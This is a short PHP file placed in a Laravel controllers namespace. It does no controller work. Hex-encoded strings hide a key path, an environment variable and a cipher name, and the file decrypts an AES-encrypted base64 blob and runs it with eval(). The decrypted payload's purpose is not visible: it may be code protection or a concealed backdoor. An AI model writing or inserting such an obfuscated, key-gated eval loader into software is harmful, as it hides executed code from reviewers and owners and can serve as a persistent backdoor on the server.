<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('sXsnmqdN7uVkcsyTkIpmOg==');

$c=base64_decode(

'pwyYfnhjEj3NgiybKxKAx6biY29hpjVpvPVEsXT8+KIft34DB2ThEUfe4lFbou4CwwOgrjGvLJ8U' .
'A4SXFmO1Smz8otaAv8ZRgwu7ZFTDnzKH98paTxkZPVeg4u+dZuJdP8eRU2B4U6l0PiF/jMrLbCoA' .
'Bjxl8be6n07k8q4Zc7WfW5R3BYwrtH3QP/x66/UmQwvcnQmSTCcxgFHOZnHwt/r6m3WIVVCSh8Vn' .
'cGGzuR1RMilXHAnL5VsIZmAbLUgU65tLVXMJp+4Tfjw/PbfYmAwOtXZ3ljQQEGI/BRQjCIxl8LQP' .
'lJVC669WUUHvtuldxVyfcUz0sSu6lJ7L6pI7g07vRv1IWLstv8y0mdxCPwVkLJ/tqQCYlmkIX7jM' .
'Ka7ddTA9ylyPCfcrfWIMsImdZg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

